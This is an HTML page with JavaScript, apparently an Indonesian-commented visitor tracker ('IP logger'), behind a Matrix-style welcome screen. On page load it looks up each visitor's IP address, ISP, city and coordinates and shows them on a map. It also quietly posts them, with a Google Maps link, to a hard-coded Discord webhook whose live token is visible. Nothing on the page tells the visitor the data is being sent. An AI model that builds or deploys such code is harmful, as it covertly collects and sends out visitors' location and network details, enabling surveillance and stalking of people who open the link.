<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Basakencana</title>
    <style>
        body { margin: 0; background: black; color: #0f0; font-family: monospace; overflow: hidden; }
        canvas { display: block; }
        #info { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); text-align: center; background: rgba(0,0,0,0.8); padding: 20px; border: 1px solid #0f0; border-radius: 10px; z-index: 10; }
        #map { height: 300px; width: 100%; max-width: 500px; margin-top: 15px; border: 2px solid #0f0; border-radius: 8px; }
    </style>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body>

    <div id="info">
        <h2>WELCOME TO BASAKENCANA</h2>
        <p id="status">Detecting visitor...</p>
        <p id="ip"></p>
        <p id="location"></p>
        <div id="map"></div>
    </div>

    <canvas id="matrix"></canvas>

    <script>
        // MASUKKAN WEBHOOK KAMU DI SINI
        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8dj5XnVCkc7du-HRYBFKAvdcxCz9jXcZqjJ_5G4hWa1rX0GUPVQ02P5as6o1Ok0xR";

        // Efek Matrix Background
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0";
            ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 33);

        // Ambil Data Pengunjung & Kirim ke Discord
        async function trackVisitor() {
            try {
                const res = await fetch("https://ipapi.co/json/");
                const data = await res.json();

                document.getElementById('status').innerText = "Visitor Detected!";
                document.getElementById('ip').innerText = "IP Address: " + data.ip;
                document.getElementById('location').innerText = "Location: " + data.city + ", " + data.country_name;

                // Tampilkan Map di Web
                const map = L.map('map').setView([data.latitude, data.longitude], 13);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                L.marker([data.latitude, data.longitude]).addTo(map).bindPopup("You are here").openPopup();

                // Kirim Pesan ke Discord
                const pesan = {
                    username: "BASAKENCANA TRACKER",
                    embeds: [{
                        title: "🚨 PENGUNJUNG BARU TERDETEKSI!",
                        color: 5763719,
                        fields: [
                            { name: "🌐 IP Address", value: `**${data.ip}**`, inline: true },
                            { name: "🏢 ISP", value: data.org, inline: true },
                            { name: "📍 Lokasi", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },
                            { name: "🗺️ Google Maps", value: `[KLIK UNTUK LIHAT LOKASI](https://www.google.com/maps?q=${data.latitude},${data.longitude})`, inline: false },
                        ],
                        timestamp: new Date()
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(pesan)
                });

            } catch (err) {
                console.log("Error:", err);
            }
        }
        trackVisitor();
    </script>
</body>
</html>
